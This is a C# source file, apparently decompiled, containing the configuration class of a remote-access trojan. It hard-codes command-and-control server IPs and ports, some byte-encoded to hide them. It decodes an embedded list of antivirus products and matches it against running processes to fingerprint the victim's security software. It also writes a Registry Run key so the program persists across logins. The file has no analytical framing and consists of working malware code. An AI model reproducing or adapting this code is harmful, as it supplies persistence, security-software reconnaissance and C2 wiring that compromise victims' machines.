using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace thnaviwa;

internal static class CONFIG
{
	public static byte[] encAvs = new byte[210]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 72, 101,
		97, 108, 44, 98, 100, 97, 103, 101, 110, 116,
		61, 66, 68, 32, 65, 103, 101, 110, 116, 44,
		109, 115, 115, 101, 99, 101, 115, 61, 77, 83,
		32, 69, 115, 115, 101, 110, 116, 105, 97, 108,
		115, 44, 102, 115, 115, 109, 51, 50, 61, 70,
		83, 101, 99, 117, 114, 101, 44, 97, 118, 112,
		61, 75, 97, 115, 112, 101, 114, 115, 107, 121,
		44, 97, 118, 103, 110, 116, 61, 65, 118, 105,
		114, 97, 44, 115, 112, 98, 98, 99, 115, 118,
		99, 61, 83, 121, 109, 97, 110, 116, 101, 99,
		44, 117, 112, 100, 97, 116, 101, 114, 117, 105,
		61, 77, 99, 65, 102, 101, 101, 44, 97, 118,
		103, 117, 105, 61, 65, 86, 71, 44, 97, 118,
		103, 99, 99, 61, 65, 86, 71, 44, 109, 98,
		97, 109, 61, 65, 110, 116, 32, 77, 97, 108,
		119, 97, 114, 101, 44, 97, 118, 97, 115, 116,
		117, 105, 61, 65, 118, 97, 115, 116, 44, 97,
		118, 97, 115, 116, 61, 65, 118, 97, 115, 116
	};

	public static string thnaviwadefaultP = "145.105.152.121|thnaviwa".Split(new char[1] { '|' })[0];

	public static string thnaviwamainApp = "thnaviwa|thnaviwa".Split(new char[1] { '|' })[0];

	public static int port = 5156;

	public static int aport = 7218;

	public static int bport = 9686;

	public static int cport = 12538;

	public static int dport = 16468;

	public static byte[] thnaviwavpsips = new byte[13]
	{
		53, 46, 49, 56, 57, 46, 49, 51, 52, 46,
		50, 49, 54
	};

	public static int thnaviwaport = 5156;

	public static string thnaviwaappPath = "\\intaRD\\|thnaviwa".Split(new char[1] { '|' })[0];

	public static string thnaviwapc_id = "bithrva|thnaviwa".Split(new char[1] { '|' })[0];

	public static string thnaviwaremvUser = "horlncais|thnaviwa".Split(new char[1] { '|' })[0];

	public static string thnaviwafilesLogs = "mibdleba".Split(new char[1] { '|' })[0];

	public static string thnaviwaloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string text2 = processes[i].ProcessName.ToLower();
				if (text2.Length <= 4)
				{
					continue;
				}
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(text2))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public static byte[] getByteArray(string value)
	{
		MemoryStream memoryStream = new MemoryStream();
		TextWriter textWriter = new StreamWriter(memoryStream);
		textWriter.Write(value);
		textWriter.Flush();
		memoryStream.Flush();
		return memoryStream.ToArray();
	}

	public static string thnaviwaget_mpath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + thnaviwaappPath;
	}

	public static void thnaviwaset_run(string app, string path)
	{
		try
		{
			string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|thnaviwa".Split(new char[1] { '|' })[0];
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
			string text = thnaviwapc_id;
			object value = registryKey.GetValue(text + app);
			if (value == null)
			{
				registryKey.SetValue(text + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text + app, path);
			}
		}
		catch
		{
		}
	}

	public static string thnaviwaOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!thnaviwa".Split(new char[1] { '!' })[0];
		}
	}
}
